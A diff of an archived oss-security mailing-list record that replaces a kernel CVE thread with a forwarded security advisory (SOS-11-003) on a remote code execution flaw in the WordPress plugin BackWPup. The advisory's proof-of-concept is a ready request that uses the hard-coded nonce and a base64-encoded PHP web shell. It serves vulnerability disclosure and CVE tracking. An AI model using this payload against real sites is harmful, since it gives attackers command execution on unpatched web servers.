@@ -1,49 +1,80 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/02/28/16
-Message-ID: <20110228232847.GF4669@outflux.net>
-Date: Mon, 28 Feb 2011 15:28:47 -0800
-From: Kees Cook <kees@...ntu.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/11/22/7
+Message-ID: <20111122100706.GA28463@foo.fgeek.fi>
+Date: Tue, 22 Nov 2011 12:07:06 +0200
+From: Henri Salo <henri@...v.fi>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE request: kernel: OOM-killer via argv expansion
+Subject: Fwd: Wordpress plugin BackWPup Remote and Local Code Execution Vulnerability - SOS-11-003
 Content-Type: text/plain; charset=utf-8
 
-On Mon, Feb 28, 2011 at 01:02:02PM -0800, Kees Cook wrote:
-> On Mon, Feb 28, 2011 at 12:32:55PM -0800, Kees Cook wrote:
-> > I think the flaw[1] with argv-expansion triggering the OOM-killer
-> > incorrectly needs its own CVE.
-> > 
-> > While the stack guard page and the fixes[2] for CVE-2010-3858 certainly
-> > improved things, argv expansion can still be tricked into OOM-killing the
-> > entire system. Solutions were discussed on the original thread, but
-> > were not finished. Recently a set of patches[3] has been re-proposed to fix
-> > this issue. Regardless, it should probably get its own CVE assigned.
-> > 
-> > Thanks,
-> > 
-> > -Kees
-> > 
-> > [1] https://lkml.org/lkml/2010/8/27/429
-> > [2] http://git.kernel.org/linus/1b528181b2ffa14721fb28ad1bd539fe1732c583
-> > [3] https://lkml.org/lkml/2011/2/25/227
-> 
-> Sorry, Nelson Elhage pointed out to me that I missed the fix for this
-> issue. The issue was been fixed with:
-> http://git.kernel.org/linus/3c77f845722158206a7209c45ccddc264d19319c
-> 
-> This was already assigned as CVE-2010-4243
-> 
-> Sorry for the noise, and thanks!
+----- Forwarded message from Lists <lists@...seofsecurity.com.au> -----
 
-Wait, I will continue to make more noise. The upstream commit
-3c77f845722158206a7209c45ccddc264d19319c does not handle the compat case,
-which https://lkml.org/lkml/2011/2/25/227 is trying to handle.
+Date: Mon, 28 Mar 2011 15:10:39 +1100
+From: Lists <lists@...seofsecurity.com.au>
+To: lists@...seofsecurity.com.au
+Subject: [Full-disclosure] Wordpress plugin BackWPup Remote and Local Code
+	Execution Vulnerability - SOS-11-003
+X-Mailer: Microsoft Outlook Express 6.00.3790.4657
 
-Does this need its own CVE?
+Sense of Security - Security Advisory - SOS-11-003
 
-Thanks,
+Release Date.                  28-Mar-2011
+Last Update.                   -
+Vendor Notification Date.      25-Mar-2010
+Product.                       Wordpress Plugin BackWPup
+Platform.                      Independent
+Affected versions.             1.6.1 (verified), possibly others
+Severity Rating.               High
+Impact.                        System Access
+Attack Vector.                 Remote without authentication
+Solution Status.               Upgrade to version 1.7.1
+CVE reference.                 Not yet assigned
 
--Kees
+Details.
+A vulnerability has been discovered in the Wordpress plugin BackWPup 
+1.6.1 which can be exploited to execute local or remote code on the web 
+server. The Input passed to the component "wp_xml_export.php" via the 
+"wpabs" variable allows the inclusion and execution of local or remote 
+PHP files as long as a "_nonce" value is known. The "_nonce" value 
+relies on a static constant which is not defined in the script meaning 
+that it defaults to the value "822728c8d9".
 
--- 
-Kees Cook
-Ubuntu Security Team
+Proof of Concept.
+wp_xml_export.php?_nonce=822728c8d9&wpabs=data://text/plain;base64,PGZ
+vcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2bIiBtZX           
+Rob2Q9IlBPU1QiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ4Ij48aW5wdXQgdHlwZT0   
+ic3VibWl0IiB2YWx1ZT0iY21kIj48L2Zvcm0%2bPHByZT48PyAKZWNobyBgeyRfUE9TVF
+sneCddfWA7ID8%2bPC9wcmU%2bPD8gZGllKCk7ID8%2bCgo%3d
+
+Solution.
+Upgrade to version 1.7.1
+
+Discovered by.
+Phil Taylor - Sense of Security Labs.
+
+Sense of Security Pty Ltd
+Level 8, 66 King St
+Sydney NSW 2000
+AUSTRALIA
+T: +61 (0)2 9290 4444
+F: +61 (0)2 9290 4455
+W: http://www.senseofsecurity.com.au
+E: info@...seofsecurity.com.au
+Twitter: @ITsecurityAU
+
+The latest version of this advisory can be found at:
+http://www.senseofsecurity.com.au/advisories/SOS-11-003.pdf
+
+Other Sense of Security advisories can be found at:
+http://www.senseofsecurity.com.au/research/it-security-advisories.php
+----- End forwarded message -----
+
+Can we assign CVE-identifier for this issue?
+
+Original advisory: http://seclists.org/fulldisclosure/2011/Mar/328 / http://www.senseofsecurity.com.au/advisories/SOS-11-003
+Fixed in version: 1.7.2 (http://wordpress.org/support/topic/plugin-backwpup-remote-and-local-codeexecution-vulnerability-sos-11-003)
+OSVDB: http://osvdb.org/show/osvdb/71481
+http://www.exploit-db.com/exploits/17056/
+
+Best regards,
+Henri Salo
